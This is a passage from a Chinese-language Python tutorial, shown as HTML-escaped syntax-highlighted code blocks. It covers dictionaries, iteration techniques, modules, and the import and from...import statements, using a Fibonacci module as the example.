&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;sape&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4139&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; guido&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4127&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; jack&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4098&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;#{&#39;sape&#39;: 4139, &#39;jack&#39;: 4098, &#39;guido&#39;: 4127}&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;字典推导&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;dict3 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; x&lt;span class=&#34;token operator&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;dict3&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# {2: 4, 4: 16, 6: 36}&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;遍历技巧&#34;&gt;&lt;a href=&#34;#遍历技巧&#34; class=&#34;headerlink&#34; title=&#34;遍历技巧&#34;&gt;&lt;/a&gt;遍历技巧&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;# 关键字和对应的值可以使用 items() 方法同时解读&lt;/span&gt;
dict4 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;123&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;999&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;haha&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;dict4&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# {&#39;123&#39;: &#39;test&#39;, &#39;999&#39;: &#39;haha&#39;}&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; y&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; v &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; dict4&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;items&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;y&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; v&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 123 test&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 999 haha&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# 索引位置和对应值可以使用 enumerate() 函数同时得到&lt;/span&gt;
list3 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;111&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;999&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;list3&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# [&#39;111&#39;, &#39;test&#39;, &#39;999&#39;]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; v &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;enumerate&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;list3&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; v&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
0 111
1 test
2 999
&#39;&#39;&#39;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 同时遍历两个或更多的序列，可以使用 zip() 组合&lt;/span&gt;
questions &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;name&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;quest&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;favorite color&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
answers &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;lancelot&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;the holy grail&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;blue&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; q&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; a &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;zip&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;questions&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; answers&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;What is your {0}?  It is {1}.&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;q&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; a&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
What is your name?  It is lancelot.
What is your quest?  It is the holy grail.
What is your favorite color?  It is blue.
&#39;&#39;&#39;&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# 反向输出, 使用reversed()函数&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;reversed&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; end&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 9 7 5 3 1 &lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# 顺序遍历一个序列，使用 sorted() 函数返回一个已排序的序列&lt;/span&gt;
basket &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;apple&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;orange&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;apple&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;pear&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;orange&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;banana&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; f &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;sorted&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;basket&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;f&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; end&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# apple banana orange pear &lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
{&#39;123&#39;: &#39;test&#39;, &#39;999&#39;: &#39;haha&#39;}
123 test
999 haha
[&#39;111&#39;, &#39;test&#39;, &#39;999&#39;]
0 111
1 test
2 999
What is your name?  It is lancelot.
What is your quest?  It is the holy grail.
What is your favorite color?  It is blue.
9 7 5 3 1 
apple banana orange pear 
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;模块&#34;&gt;&lt;a href=&#34;#模块&#34; class=&#34;headerlink&#34; title=&#34;模块&#34;&gt;&lt;/a&gt;模块&lt;/h2&gt;&lt;p&gt;模块是一个包含所有你定义的函数和变量的文件，其后缀名是.py，意思是你能直接调用写好的函数或者变量来执行你的任务，这些写好的函数和变量被封装在一个文件包中&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; sys

&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;命令行参数如下:&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;argv&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;\n\nPython 路径为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;path&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;\n&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;ol&gt;
&lt;li&gt;import sys 引入 python 标准库中的 sys.py 模块&lt;/li&gt;
&lt;li&gt;sys.argv 是一个包含命令行参数的列表&lt;/li&gt;
&lt;li&gt;sys.path 包含了一个 Python 解释器自动查找所需模块的路径的列表&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;import语句&#34;&gt;&lt;a href=&#34;#import语句&#34; class=&#34;headerlink&#34; title=&#34;import语句&#34;&gt;&lt;/a&gt;import语句&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; module1&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; module2&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt; moduleN&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;ol&gt;
&lt;li&gt;import只会导入一次&lt;/li&gt;
&lt;li&gt;解释器收缩路径是在sys.path中确定&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;在sys.path任一路径下创建文件fibo.py&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;# 斐波那契(fibonacci)数列模块&lt;/span&gt;
 
&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;fib&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;    &lt;span class=&#34;token comment&#34;&gt;# 定义到 n 的斐波那契数列&lt;/span&gt;
    a&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; b &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; b &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt; n&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;b&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; end&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        a&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; b &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; a&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;b
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
 
&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;fib2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;# 返回到 n 的斐波那契数列&lt;/span&gt;
    result &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
    a&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; b &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; b &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt; n&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        result&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;append&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;b&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        a&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; b &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; a&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;b
    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; result&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;引入模块使用&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;fibo&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;fib&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
fibo&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;fib2&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

fib &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; fibo&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;fib &lt;span class=&#34;token comment&#34;&gt;# 将函数赋给本地&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;from-…-import-语句&#34;&gt;&lt;a href=&#34;#from-…-import-语句&#34; class=&#34;headerlink&#34; title=&#34;from … import 语句&#34;&gt;&lt;/a&gt;from … import 语句&lt;/h3&gt;&lt;p&gt;Python 的 from 语句让你从模块中导入一个指定的部分到当前命名空间中&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; modname &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; name1&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; name2&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt; nameN&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;要导入模块 fibo 的 fib 函数&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; fibo &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; fib&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; fib2&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这个声明不会把整个fibo模块导入到当前的命名空间中，它只会将fibo里的fib函数引入进来&lt;/p&gt;
